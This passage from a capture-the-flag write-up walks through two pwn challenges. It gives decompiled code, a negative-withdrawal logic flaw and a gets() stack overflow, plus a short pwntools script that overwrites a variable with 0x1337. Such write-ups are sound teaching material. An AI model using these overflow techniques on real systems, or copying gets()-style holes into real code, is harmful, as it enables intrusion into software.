##### `show_flag` Function
```c
void show_flag(void)

{
  char *pcVar1;
  char local_118 [264];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("Could not open flag.txt");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  while( true ) {
    pcVar1 = fgets(local_118,0x100,local_10);
    if (pcVar1 == (char *)0x0) break;
    printf("%s",local_118);
  }
  fclose(local_10);
  return;
}
```
#### Vulnerability Analysis
In order to trigger the `show_flag` function, we must pass the check `current_balance == 1000000`. `current_balance` set to 100 before the check. The key vulnerability is that our `amount_to_withdraw` is only checked if we input 0, it did not check if our input is negative, which means we can input negative value to make our `current_balance == 1000000`. `100 - 1000000 = -999900`, so the solution is `-999900`.

```

### Challenge 2
- You can download the binary [here](/assets/challenges/CNCC_1st/pwn2).

#### Decompiled Code (Ghidra)
##### `main` Function

undefined8 main(void)

{

  return 0;
}
```
##### `vuln` Function
```c

void vuln(void)

{
  undefined1 buffer [76];
  uint target;
  
  target = 0;
  printf("Enter your input:\n> ");
  gets(buffer);
  if (target == 0x1337) {
    win();
  }
  else {
    printf("[-] magic = %d (0x%x). Try again!\n",(ulong)target,(ulong)target);
  }
  return;
}
```
##### `win` Function
```c
void win(void)

{
  puts("[+] Success! You set magic to 0x1337!");
  system("cat flag.txt");
  return;
}
```
#### Vulnerability Analysis
There is a buffer overflow vulnerability in `vuln` function due to the use of `gets` function, which reads into buffer without checking the buffer size. In order to trigger the `win` function, we need to read in our input past the buffer to overwrite `target` and set it to 0x1337, which sits next to the buffer. So, we need to input 76 bytes to fill the buffer and input 0x1337 after that.
#### Exploitation
```python
from pwn import *

p = process('./pwn2')
# p = remote('3.1.32.51', 8010)

payload = b'A'*76
payload += p64(0x1337)

p.sendline(payload)
p.interactive()
```
